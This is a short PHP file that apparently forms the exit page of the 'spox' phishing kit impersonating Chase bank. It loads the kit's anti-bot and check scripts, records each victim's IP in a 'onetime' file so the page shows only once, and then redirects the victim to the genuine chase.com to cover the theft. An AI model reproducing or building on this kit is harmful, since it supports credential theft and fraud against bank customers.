<?php
session_start();
error_reporting(0);
include 'spox_bot.php';
include'check.php';
if($onetime == "on") {
  new_file("security/onetime.dat","$ip_spox");
}
      exit(header("Location: https://www.chase.com/")); // BYE :(

?>